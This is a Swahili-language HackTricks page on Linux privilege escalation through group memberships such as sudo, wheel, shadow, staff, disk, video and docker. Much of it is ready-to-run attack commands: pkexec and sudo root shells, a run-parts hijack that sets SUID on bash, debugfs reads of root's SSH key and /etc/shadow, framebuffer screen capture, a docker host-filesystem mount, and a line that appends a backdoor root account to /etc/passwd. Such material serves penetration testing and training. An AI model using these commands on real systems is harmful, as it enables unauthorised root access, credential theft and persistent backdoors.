# Vikundi vya Kuvutia - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Vikundi vya Sudo/Admin

### **PE - Method 1**

**Wakati mwingine**, **kwa default (au kwa sababu software fulani inaihitaji)** ndani ya faili ya **/etc/sudoers** unaweza kupata baadhi ya mistari hii:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kwamba **mtumiaji yeyote aliye katika group sudo au admin anaweza kutekeleza chochote kama sudo**.

Ikiwa hali hii ipo, ili **kuwa root unaweza kutekeleza tu**:
```
sudo su
```
### PE - Method 2

Tafuta binary zote za suid na angalia kama kuna binary ya **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Ukigundua kuwa binary **pkexec ni binary ya SUID** na wewe ni mwanachama wa **sudo** au **admin**, huenda ukaweza kutekeleza binaries kwa kutumia sudo kupitia `pkexec`.\
Hii ni kwa sababu kwa kawaida hayo ndiyo makundi yaliyo ndani ya **polkit policy**. Policy hii hutambua kimsingi ni makundi gani yanaweza kutumia `pkexec`. Iangalie kwa:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Hapo utaona ni groups zipi zimeruhusiwa ku-execute **pkexec** na **by default** katika baadhi ya Linux distros; groups **sudo** na **admin** huonekana.

Ili **kuwa root**, unaweza ku-execute:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Ukijaribu kutekeleza **pkexec** na kupata **kosa** hili:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Si kwa sababu huna ruhusa, bali kwa sababu hujaunganishwa bila GUI**. Na kuna njia ya kukwepa tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **vipindi 2 tofauti vya ssh**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**Wakati mwingine**, **kwa chaguo-msingi** ndani ya faili ya **/etc/sudoers** unaweza kupata mstari huu:
```
%wheel	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kwamba **mtumiaji yeyote aliye katika group wheel anaweza kutekeleza chochote kwa kutumia sudo**.

Ikiwa ndivyo ilivyo, ili **kuwa root unaweza kutekeleza tu**:
```
sudo su
```
## Kikundi cha Shadow

Watumiaji wa **kikundi cha shadow** wanaweza **kusoma** faili ya **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Kwa hiyo, soma faili na ujaribu **crack some hashes**.

Maelezo muhimu kuhusu hali ya kufungwa wakati wa kuchanganua hashes:
- Entries zilizo na `!` au `*` kwa ujumla haziwezi kutumika kuingia kwa kutumia password.
- `!hash` kwa kawaida humaanisha kuwa password iliwekwa kisha ikafungwa.
- `*` kwa kawaida humaanisha kuwa hakuna valid password hash iliyowahi kuwekwa.
Hii ni muhimu kwa uainishaji wa akaunti hata wakati direct login imezuiwa.

## Kikundi cha Staff

**staff**: Huwaruhusu users kuongeza marekebisho ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji root privileges (kumbuka kuwa executables zilizo katika `/usr/local/bin` ziko kwenye PATH variable ya user yeyote, na zinaweza "override" executables zilizo katika `/bin` na `/usr/bin` zenye jina lilelile). Linganisha na group "adm", ambayo inahusiana zaidi na monitoring/security. [\[source\]](https://wiki.debian.org/SystemGroups)

Katika Debian distributions, variable ya `$PATH` inaonyesha kuwa `/usr/local/` itaendeshwa kwa priority ya juu zaidi, iwe wewe ni privileged user au la.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Tukifanikiwa kuteka nyara baadhi ya programu zilizo kwenye `/usr/local`, tunaweza kupata root kwa urahisi.

Kuteka nyara programu ya `run-parts` ni njia rahisi ya kupata root, kwa sababu programu nyingi zitaendesha `run-parts` (kama crontab, wakati wa kuingia kupitia ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
au Unapoingia kwenye session mpya ya ssh.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Kikundi cha Diski

Ruhusa hii ni karibu **sawa na ufikiaji wa root** kwa sababu unaweza kufikia data yote iliyo ndani ya mashine.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Kumbuka kwamba kwa kutumia debugfs unaweza pia **kuandika faili**. Kwa mfano, ili kunakili `/tmp/asd1.txt` hadi `/tmp/asd2.txt` unaweza kufanya:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Hata hivyo, ukijaribu **kuandika faili zinazomilikiwa na root** (kama `/etc/shadow` au `/etc/passwd`) utapata kosa la "**Permission denied**".

## Kundi la Video

Kwa kutumia amri `w` unaweza kujua **ni nani aliyeingia kwenye mfumo** na itaonyesha matokeo kama yafuatayo:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** inamaanisha kuwa mtumiaji **yossi ameingia kimwili** kwenye terminali ya mashine.

Kikundi cha **video** kinaweza kufikia na kuona matokeo ya skrini. Kimsingi, unaweza kuangalia kinachoonyeshwa kwenye skrini. Ili kufanya hivyo, unahitaji **kunasa picha ya sasa kwenye skrini** kama raw data na kupata resolution inayotumiwa na skrini. Data ya skrini inaweza kuhifadhiwa kwenye `/dev/fb0`, na unaweza kupata resolution ya skrini hii kwenye `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Ili **kufungua** **raw image** unaweza kutumia **GIMP**, chagua faili ya **`screen.raw`** na uchague **Raw image data** kama aina ya faili:

![Disk Group - Video Group: Ili kufungua raw image unaweza kutumia GIMP, chagua faili ya screen.raw na uchague Raw image data kama aina ya faili](<../../../images/image (463).png>)

Kisha badilisha Width na Height ziwe zile zinazotumiwa kwenye skrini na ujaribu Image Types tofauti (na uchague ile inayoonyesha skrini vizuri zaidi):

![Disk Group - Video Group: Kisha badilisha Width na Height ziwe zile zinazotumiwa kwenye skrini na ujaribu Image Types tofauti (na uchague ile inayoonyesha skrini vizuri zaidi)](<../../../images/image (317).png>)

## Root Group

Inaonekana kwamba kwa default **members of root group** wanaweza kupata access ya **modify** baadhi ya faili za configuration za **service**, baadhi ya faili za **libraries**, au **other interesting things** ambazo zinaweza kutumiwa ku-escalate privileges...

**Angalia ni faili zipi members wa root wanaweza ku-modify**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Kikundi cha Docker

Unaweza **ku-mount root filesystem ya host machine kwenye volume ya instance**, hivyo instance inapoanza hu-load `chroot` mara moja kwenye volume hiyo. Hii kwa ufanisi hukupa root kwenye machine hiyo.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Hatimaye, ikiwa hupendi mapendekezo yoyote ya hapo awali, au hayafanyi kazi kwa sababu fulani (docker api firewall?), unaweza kila mara kujaribu **run a privileged container and escape from it** kama ilivyoelezwa hapa:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Ikiwa una ruhusa za kuandika kwenye docker socket, soma [**chapisho hili kuhusu jinsi ya kuongeza privileges kwa kutumia vibaya docker socket**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Kikundi cha lxc/lxd


{{#ref}}
./
{{#endref}}

## Kikundi cha Adm

Kwa kawaida **members** wa kikundi cha **`adm`** wana ruhusa za **kusoma log** files zilizo ndani ya _/var/log/_.\
Kwa hiyo, ikiwa umecompromise user aliye ndani ya kikundi hiki, hakikisha unafanya **uchunguzi wa logs**.

## Vikundi vya Backup / Operator / lp / Mail

Vikundi hivi mara nyingi ni **credential-discovery** vectors badala ya vectors za moja kwa moja za root:
- **backup**: inaweza kufichua archives zenye configs, keys, DB dumps, au tokens.
- **operator**: operational access maalum kwa platform ambayo inaweza ku-leak runtime data nyeti.
- **lp**: print queues/spools zinaweza kuwa na contents za documents.
- **mail**: mail spools zinaweza kufichua reset links, OTPs, na credentials za ndani.

Chukulia membership katika vikundi hivi kama finding yenye thamani kubwa ya data exposure, kisha fanya pivot kwa kutumia tena passwords/tokens.

## Kikundi cha Auth

Ndani ya OpenBSD, kikundi cha **auth** kwa kawaida kinaweza kuandika kwenye folders _**/etc/skey**_ na _**/var/db/yubikey**_ ikiwa zinatumika.\
Ruhusa hizi zinaweza kutumiwa vibaya kupitia exploit ifuatayo ili **kuongeza privileges** hadi root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
